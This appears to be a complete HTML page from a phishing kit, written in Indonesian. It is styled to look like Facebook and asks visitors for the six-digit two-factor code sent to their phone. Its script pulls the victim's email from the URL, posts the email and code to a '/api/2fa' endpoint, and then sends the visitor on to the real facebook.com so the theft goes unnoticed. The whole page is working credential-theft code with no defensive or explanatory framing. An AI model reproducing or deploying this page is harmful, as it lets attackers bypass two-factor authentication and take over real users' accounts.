<!DOCTYPE html>
<html>
<head>
    <title>Masukkan Kode Verifikasi</title>
    <style>
        /* CSS sama seperti sebelumnya */
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; }
        h2 { color: #1c1e21; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccd0d5; border-radius: 6px; }
        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Verifikasi Keamanan</h2>
        <p>Masukkan kode 6 digit yang dikirim ke telepon Anda.</p>
        <input type="text" id="code" maxlength="6" placeholder="000000">
        <button onclick="submitCode()">Lanjutkan</button>
    </div>
    
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        async function submitCode(){
            const code = document.getElementById('code').value;
            
            await fetch('/api/2fa', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({email, code})
            });
            
            // Redirect ke Facebook asli
            window.location.href = 'https://facebook.com';
        }
    </script>
</body>
</html>
